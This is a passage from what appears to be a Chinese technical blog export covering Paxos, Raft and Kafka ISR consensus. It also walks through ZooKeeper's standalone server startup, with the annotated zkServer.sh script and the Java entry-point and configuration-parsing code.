<li>acceptor收到prepare消息后，如果提案的编号大于它已经回复的所有prepare消息，则acceptor将自己上次接受的提案回复给proposer，并承诺不再回复小于n的提案；</li>
</ul>
<h2 id="批准阶段"><a href="#批准阶段" class="headerlink" title="批准阶段"></a>批准阶段</h2><ul>
<li>当一个proposer收到了多数acceptors对prepare的回复后，就进入批准阶段。它要向回复prepare请求的acceptors发送accept请求，包括编号n和根据P2c决定的value（如果根据P2c没有已经接受的value，那么它可以自由决定value）。</li>
<li>在不违背自己向其他proposer的承诺的前提下，acceptor收到accept请求后即接受这个请求。</li>
</ul>
</blockquote>
<p>这个过程在任何时候中断都可以保证正确性。例如如果一个proposer发现已经有其他proposers提出了编号更高的提案，则有必要中断这个过程。因此为了优化，在上述prepare过程中，如果一个acceptor发现存在一个更高编号的提案，则需要通知proposer，提醒其中断这次提案。</p>
<p>关于活锁问题,通过选举主Proposer并且规定只能主proposer才能提出议案.</p>
<blockquote>
<h1 id="四、Raft算法"><a href="#四、Raft算法" class="headerlink" title="四、Raft算法"></a>四、Raft算法</h1></blockquote>
<p>Raft 是一种用来管理日志复制的一致性算法。它和 Paxos 的性能和功能是一样的，但是它和 Paxos 的结构不一样；这使得 Raft 更容易理解并且更易于建立实际的系统。为了提高理解性，Raft 将一致性算法分为了几个部分，例如领导选取（leader selection），日志复制（log replication）和安全性（safety），同时它使用了更强的一致性来减少了必须需要考虑的状态。从用户学习的结果来看，Raft 比 Paxos 更容易学会。Raft 还包括了一种新的机制来使得动态改变集群成员，它使用重叠大多数（overlapping majorities）来保证安全。</p>
<blockquote>
<h1 id="五、ISR的机制-解决f容错的2f-1成本问题"><a href="#五、ISR的机制-解决f容错的2f-1成本问题" class="headerlink" title="五、ISR的机制(解决f容错的2f+1成本问题)"></a>五、ISR的机制(解决f容错的2f+1成本问题)</h1></blockquote>
<p>Kafka并没有使用Zab或Paxos协议的多数投票机制来保证主备数据的一致性，而是提出了ISR的机制（In-Sync Replicas）的机制来保证数据一致性。</p>
<p>ISR认为对于2f+1个副本来说，多数投票机制要求最多只能允许f个副本发生故障，如果要支持2个副本的容错，则需要至少维持5个副本，对于消息系统的场景来说，效率太低。</p>
<p>ISR的运行机制如下：将所有次级副本数据分到两个集合，其中一个被称为ISR集合，这个集合备份数据的特点是即时和主副本数据保持一致，而另外一个集合的备份数据允许其消息队列落后于主副本的数据。在做主备切换时，只允许从ISR集合中选择主副本，只有ISR集合内所有备份都写成功才能认为这次写入操作成功。在具体实现时，kafka利用zookeeper来保持每个ISR集合的信息，当ISR集合内成员变化时，相关构件也便于通知。通过这种方式，如果设定ISR集合大小为f+1，那么可以最多允许f个副本故障，而对于多数投票机制来说，则需要2f+1个副本才能达到相同的容错性。</p>
<blockquote>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">拜占庭将军问题</a></li>
<li><a href="https://en.wikipedia.org/wiki/Paxos_(computer_science" target="_blank" rel="noopener">Paxos</a>)</li>
<li><a href="http://lamport.azurewebsites.net/pubs/lamport-paxos.pdf" target="_blank" rel="noopener">The Part-Time Parliament</a></li>
<li><a href="http://www.infoq.com/cn/articles/raft-paper" target="_blank" rel="noopener">Raft 一致性算法论文译文</a></li>
<li><a href="https://www.cnblogs.com/mengyou0304/p/4836555.html" target="_blank" rel="noopener">Kafka 几个实现细节</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper 源码分析二之 server 启动过程(standalone)</title>
    <url>/2019/04/06/distributed/zookeeper%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%BA%8C%E4%B9%8Bserver%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B(standalone)/</url>
    <content><![CDATA[<p>zk server 启动简单的流程图<br><img src="/2019/04/06/distributed/zookeeper源码分析二之server启动过程(standalone)/zk_server_20190407.png" alt></p>
<a id="more"></a>
<h1 id="server-启动"><a href="#server-启动" class="headerlink" title="server 启动"></a>server 启动</h1><p>通常用 zkServer.sh start 命令来启动 zk server。我们从这里才查看 zk server 的启动入口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 当前脚本所在的路径</span></span><br><span class="line">ZOOBIN=<span class="string">"<span class="variable">$&#123;BASH_SOURCE-$0&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 当前脚本所闻的目录名称</span></span><br><span class="line">ZOOBIN=<span class="string">"<span class="variable">$(dirname "$&#123;ZOOBIN&#125;")</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入ZOOBIN所有的目录并显示当前位置</span></span><br><span class="line">ZOOBINDIR=<span class="string">"<span class="variable">$(cd "$&#123;ZOOBIN&#125;"; pwd)</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="string">"<span class="variable">$ZOOBIN</span>/../libexec/zkEnv.sh"</span> ]; <span class="keyword">then</span></span><br><span class="line">  . <span class="string">"<span class="variable">$ZOOBINDIR</span>/../libexec/zkEnv.sh"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  . <span class="string">"<span class="variable">$ZOOBINDIR</span>/zkEnv.sh"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See the following page for extensive details on setting</span></span><br><span class="line"><span class="comment"># up the JVM to accept JMX remote management:</span></span><br><span class="line"><span class="comment"># http://java.sun.com/javase/6/docs/technotes/guides/management/agent.html</span></span><br><span class="line"><span class="comment"># by default we allow local JMX connections</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果JMXLOCALONLY不存在则JMXLOCALONLY=false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXLOCALONLY</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    JMXLOCALONLY=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JMX是否被禁用。如果JMX没有被禁用,检测是否需要SSL或AUTH认证等信息.最终拼接带对应虚拟机参数的启动类</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXDISABLE</span>"</span> = <span class="string">"x"</span> ] || [ <span class="string">"<span class="variable">$JMXDISABLE</span>"</span> = <span class="string">'false'</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"ZooKeeper JMX enabled by default"</span> &gt;&amp;2</span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXPORT</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># for some reason these two options are necessary on jdk6 on Ubuntu</span></span><br><span class="line">    <span class="comment">#   accord to the docs they are not necessary, but otw jconsole cannot</span></span><br><span class="line">    <span class="comment">#   do a local attach</span></span><br><span class="line">    ZOOMAIN=<span class="string">"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=<span class="variable">$JMXLOCALONLY</span> org.apache.zookeeper.server.quorum.QuorumPeerMain"</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXAUTH</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      JMXAUTH=<span class="literal">false</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXSSL</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      JMXSSL=<span class="literal">false</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"x<span class="variable">$JMXLOG4J</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      JMXLOG4J=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ZooKeeper remote JMX Port set to <span class="variable">$JMXPORT</span>"</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ZooKeeper remote JMX authenticate set to <span class="variable">$JMXAUTH</span>"</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ZooKeeper remote JMX ssl set to <span class="variable">$JMXSSL</span>"</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ZooKeeper remote JMX log4j set to <span class="variable">$JMXLOG4J</span>"</span> &gt;&amp;2</span><br><span class="line">    ZOOMAIN=<span class="string">"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=<span class="variable">$JMXPORT</span> -Dcom.sun.management.jmxremote.authenticate=<span class="variable">$JMXAUTH</span> -Dcom.sun.management.jmxremote.ssl=<span class="variable">$JMXSSL</span> -Dzookeeper.jmx.log4j.disable=<span class="variable">$JMXLOG4J</span> org.apache.zookeeper.server.quorum.QuorumPeerMain"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"JMX disabled by user request"</span> &gt;&amp;2</span><br><span class="line">    ZOOMAIN=<span class="string">"org.apache.zookeeper.server.quorum.QuorumPeerMain"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 是否有虚拟机的参数配置信息</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$SERVER_JVMFLAGS</span>"</span>  != <span class="string">"x"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    JVMFLAGS=<span class="string">"<span class="variable">$SERVER_JVMFLAGS</span> <span class="variable">$JVMFLAGS</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 第二个参数是配置文件信息</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$2</span>"</span> != <span class="string">"x"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    ZOOCFG=<span class="string">"<span class="variable">$ZOOCFGDIR</span>/<span class="variable">$2</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if we give a more complicated path to the config, don't screw around in $ZOOCFGDIR</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$(dirname "$ZOOCFG")</span>"</span> != <span class="string">"x<span class="variable">$ZOOCFGDIR</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    ZOOCFG=<span class="string">"<span class="variable">$2</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测linux的环境信息</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$cygwin</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    ZOOCFG=`cygpath -wp <span class="string">"<span class="variable">$ZOOCFG</span>"</span>`</span><br><span class="line">    <span class="comment"># cygwin has a "kill" in the shell itself, gets confused</span></span><br><span class="line">    KILL=/bin/<span class="built_in">kill</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KILL=<span class="built_in">kill</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Using config: <span class="variable">$ZOOCFG</span>"</span> &gt;&amp;2</span><br><span class="line"></span><br><span class="line"><span class="comment">## 检测OS的类型,solaris特殊处理</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$OSTYPE</span>"</span> <span class="keyword">in</span></span><br><span class="line">*solaris*)</span><br><span class="line">  GREP=/usr/xpg4/bin/grep</span><br><span class="line">  ;;</span><br><span class="line">*)</span><br><span class="line">  GREP=grep</span><br><span class="line">  ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    ZOO_DATADIR=<span class="string">"<span class="variable">$($GREP "^[[:space:]]*dataDir" "$ZOOCFG" | sed -e 's/.*=//')</span>"</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -d <span class="string">"<span class="variable">$ZOO_DATADIR</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">        mkdir -p <span class="string">"<span class="variable">$ZOO_DATADIR</span>"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ZOOPIDFILE=<span class="string">"<span class="variable">$ZOO_DATADIR</span>/zookeeper_server.pid"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># ensure it exists, otw stop will fail</span></span><br><span class="line">    mkdir -p <span class="string">"<span class="variable">$(dirname "$ZOOPIDFILE")</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -w <span class="string">"<span class="variable">$ZOO_LOG_DIR</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$ZOO_LOG_DIR</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建out文件</span></span><br><span class="line"></span><br><span class="line">_ZOO_DAEMON_OUT=<span class="string">"<span class="variable">$ZOO_LOG_DIR</span>/zookeeper.out"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 获取第一参数，为对应方法名称</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动server</span></span><br><span class="line">start)</span><br><span class="line">    <span class="built_in">echo</span>  -n <span class="string">"Starting zookeeper ... "</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">kill</span> -0 `cat <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span>` &gt; /dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">echo</span> <span class="variable">$command</span> already running as process `cat <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span>`.</span><br><span class="line">         <span class="built_in">exit</span> 0</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    nohup <span class="string">"<span class="variable">$JAVA</span>"</span> <span class="string">"-Dzookeeper.log.dir=<span class="variable">$&#123;ZOO_LOG_DIR&#125;</span>"</span> <span class="string">"-Dzookeeper.root.logger=<span class="variable">$&#123;ZOO_LOG4J_PROP&#125;</span>"</span> \</span><br><span class="line">    -cp <span class="string">"<span class="variable">$CLASSPATH</span>"</span> <span class="variable">$JVMFLAGS</span> <span class="variable">$ZOOMAIN</span> <span class="string">"<span class="variable">$ZOOCFG</span>"</span> &gt; <span class="string">"<span class="variable">$_ZOO_DAEMON_OUT</span>"</span> 2&gt;&amp;1 &lt; /dev/null &amp;</span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"<span class="variable">$OSTYPE</span>"</span> <span class="keyword">in</span></span><br><span class="line">      *solaris*)</span><br><span class="line">        /bin/<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;!&#125;</span>\\c"</span> &gt; <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span></span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        /bin/<span class="built_in">echo</span> -n $! &gt; <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span></span><br><span class="line">        ;;</span><br><span class="line">      <span class="keyword">esac</span></span><br><span class="line">      <span class="keyword">if</span> [ $? -eq 0 ];</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        sleep 1</span><br><span class="line">        <span class="built_in">echo</span> STARTED</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> FAILED TO WRITE PID</span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> SERVER DID NOT START</span><br><span class="line">      <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="comment">#区别于start,非后台启动</span></span><br><span class="line">start-foreground)</span><br><span class="line">    ZOO_CMD=(<span class="built_in">exec</span> <span class="string">"<span class="variable">$JAVA</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$&#123;ZOO_NOEXEC&#125;</span>"</span> != <span class="string">""</span> ]; <span class="keyword">then</span></span><br><span class="line">      ZOO_CMD=(<span class="string">"<span class="variable">$JAVA</span>"</span>)</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="string">"<span class="variable">$&#123;ZOO_CMD[@]&#125;</span>"</span> <span class="string">"-Dzookeeper.log.dir=<span class="variable">$&#123;ZOO_LOG_DIR&#125;</span>"</span> <span class="string">"-Dzookeeper.root.logger=<span class="variable">$&#123;ZOO_LOG4J_PROP&#125;</span>"</span> \</span><br><span class="line">    -cp <span class="string">"<span class="variable">$CLASSPATH</span>"</span> <span class="variable">$JVMFLAGS</span> <span class="variable">$ZOOMAIN</span> <span class="string">"<span class="variable">$ZOOCFG</span>"</span></span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印命令</span></span><br><span class="line"><span class="built_in">print</span>-cmd)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"\"<span class="variable">$JAVA</span>\" -Dzookeeper.log.dir=\"<span class="variable">$&#123;ZOO_LOG_DIR&#125;</span>\" -Dzookeeper.root.logger=\"<span class="variable">$&#123;ZOO_LOG4J_PROP&#125;</span>\" -cp \"<span class="variable">$CLASSPATH</span>\" <span class="variable">$JVMFLAGS</span> <span class="variable">$ZOOMAIN</span> \"<span class="variable">$ZOOCFG</span>\" &gt; \"<span class="variable">$_ZOO_DAEMON_OUT</span>\" 2&gt;&amp;1 &lt; /dev/null"</span></span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止server,kill掉进程并删除pid文件</span></span><br><span class="line">stop)</span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Stopping zookeeper ... "</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"no zookeeper to stop (could not find file <span class="variable">$ZOOPIDFILE</span>)"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="variable">$KILL</span> -9 $(cat <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span>)</span><br><span class="line">      rm <span class="string">"<span class="variable">$ZOOPIDFILE</span>"</span></span><br><span class="line">      <span class="built_in">echo</span> STOPPED</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级zk 数据库</span></span><br><span class="line">upgrade)</span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"upgrading the servers to 3.*"</span></span><br><span class="line">    <span class="string">"<span class="variable">$JAVA</span>"</span> <span class="string">"-Dzookeeper.log.dir=<span class="variable">$&#123;ZOO_LOG_DIR&#125;</span>"</span> <span class="string">"-Dzookeeper.root.logger=<span class="variable">$&#123;ZOO_LOG4J_PROP&#125;</span>"</span> \</span><br><span class="line">    -cp <span class="string">"<span class="variable">$CLASSPATH</span>"</span> <span class="variable">$JVMFLAGS</span> org.apache.zookeeper.server.upgrade.UpgradeMain <span class="variable">$&#123;@&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Upgrading ... "</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="comment"># 重启server</span></span><br><span class="line">restart)</span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="string">"<span class="variable">$0</span>"</span> stop <span class="variable">$&#123;@&#125;</span></span><br><span class="line">    sleep 3</span><br><span class="line">    <span class="string">"<span class="variable">$0</span>"</span> start <span class="variable">$&#123;@&#125;</span></span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取server状态信息,主要是server的四字命令</span></span><br><span class="line">status)</span><br><span class="line">    <span class="comment"># -q is necessary on some versions of linux where nc returns too quickly, and no stat result is output</span></span><br><span class="line">    clientPortAddress=`<span class="variable">$GREP</span> <span class="string">"^[[:space:]]*clientPortAddress[^[:alpha:]]"</span> <span class="string">"<span class="variable">$ZOOCFG</span>"</span> | sed -e <span class="string">'s/.*=//'</span>`</span><br><span class="line">    <span class="keyword">if</span> ! [ <span class="variable">$clientPortAddress</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">	clientPortAddress=<span class="string">"localhost"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    clientPort=`<span class="variable">$GREP</span> <span class="string">"^[[:space:]]*clientPort[^[:alpha:]]"</span> <span class="string">"<span class="variable">$ZOOCFG</span>"</span> | sed -e <span class="string">'s/.*=//'</span>`</span><br><span class="line">    STAT=`<span class="string">"<span class="variable">$JAVA</span>"</span> <span class="string">"-Dzookeeper.log.dir=<span class="variable">$&#123;ZOO_LOG_DIR&#125;</span>"</span> <span class="string">"-Dzookeeper.root.logger=<span class="variable">$&#123;ZOO_LOG4J_PROP&#125;</span>"</span> \</span><br><span class="line">             -cp <span class="string">"<span class="variable">$CLASSPATH</span>"</span> <span class="variable">$JVMFLAGS</span> org.apache.zookeeper.client.FourLetterWordMain \</span><br><span class="line">             <span class="variable">$clientPortAddress</span> <span class="variable">$clientPort</span> srvr 2&gt; /dev/null    \</span><br><span class="line">          | <span class="variable">$GREP</span> Mode`</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"x<span class="variable">$STAT</span>"</span> = <span class="string">"x"</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Error contacting service. It is probably not running."</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$STAT</span></span><br><span class="line">        <span class="built_in">exit</span> 0</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 不是以上命令则提示对应的命令信息</span></span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> &#123;start|start-foreground|stop|restart|status|upgrade|print-cmd&#125;"</span> &gt;&amp;2</span><br><span class="line"></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>主要看 start 方法,如果存在 pid 文件则直接退出.</p>
<h2 id="QuorumPeerMain-启动过程"><a href="#QuorumPeerMain-启动过程" class="headerlink" title="QuorumPeerMain 启动过程"></a>QuorumPeerMain 启动过程</h2><p>main 方法为 server 启动入口.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        QuorumPeerMain main = <span class="keyword">new</span> QuorumPeerMain();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            main.initializeAndRun(args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Invalid arguments, exiting abnormally"</span>, e);</span><br><span class="line">            LOG.info(USAGE);</span><br><span class="line">            System.err.println(USAGE);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigException e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Invalid config, exiting abnormally"</span>, e);</span><br><span class="line">            System.err.println(<span class="string">"Invalid config, exiting abnormally"</span>);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Unexpected exception, exiting abnormally"</span>, e);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        LOG.info(<span class="string">"Exiting normally"</span>);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用 initializeAndRun 方法初始化并运行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> 初始化并运行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initializeAndRun</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> ConfigException, IOException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 创建配置对象</span></span><br><span class="line">       QuorumPeerConfig config = <span class="keyword">new</span> QuorumPeerConfig();</span><br><span class="line">       <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">           config.parse(args[<span class="number">0</span>]);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Start and schedule the the purge task</span></span><br><span class="line">       DatadirCleanupManager purgeMgr = <span class="keyword">new</span> DatadirCleanupManager(config</span><br><span class="line">               .getDataDir(), config.getDataLogDir(), config</span><br><span class="line">               .getSnapRetainCount(), config.getPurgeInterval());</span><br><span class="line">       purgeMgr.start();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 如果参数长度为1,并且配置的server大于0则为集群模式</span></span><br><span class="line">       <span class="keyword">if</span> (args.length == <span class="number">1</span> &amp;&amp; config.servers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           runFromConfig(config);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           LOG.warn(<span class="string">"Either no config or no quorum defined in config, running "</span></span><br><span class="line">                   + <span class="string">" in standalone mode"</span>);</span><br><span class="line">           <span class="comment">// 单机运行</span></span><br><span class="line">           ZooKeeperServerMain.main(args);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>加载配置信息，判断以集群还是单机方式运行。下面先看解析配置和单机运行的源码。</p>
<h3 id="zoo-cfg-封装为-QuorumPeerConfig"><a href="#zoo-cfg-封装为-QuorumPeerConfig" class="headerlink" title="zoo.cfg 封装为 QuorumPeerConfig"></a>zoo.cfg 封装为 QuorumPeerConfig</h3><p>将 zoo.cfg 配置信息解析封装为 QuorumPeerConfig。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@param</span> path  配置文件路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(String path)</span> <span class="keyword">throws</span> ConfigException </span>&#123;</span><br><span class="line">        File configFile = <span class="keyword">new</span> File(path);</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">"Reading configuration from: "</span> + configFile);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!configFile.exists()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(configFile.toString()</span><br><span class="line">                        + <span class="string">" file is missing"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Properties cfg = <span class="keyword">new</span> Properties();</span><br><span class="line">            FileInputStream in = <span class="keyword">new</span> FileInputStream(configFile);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//加载到Properties</span></span><br><span class="line">                cfg.load(in);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//从Properties加载</span></span><br><span class="line">            parseProperties(cfg);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
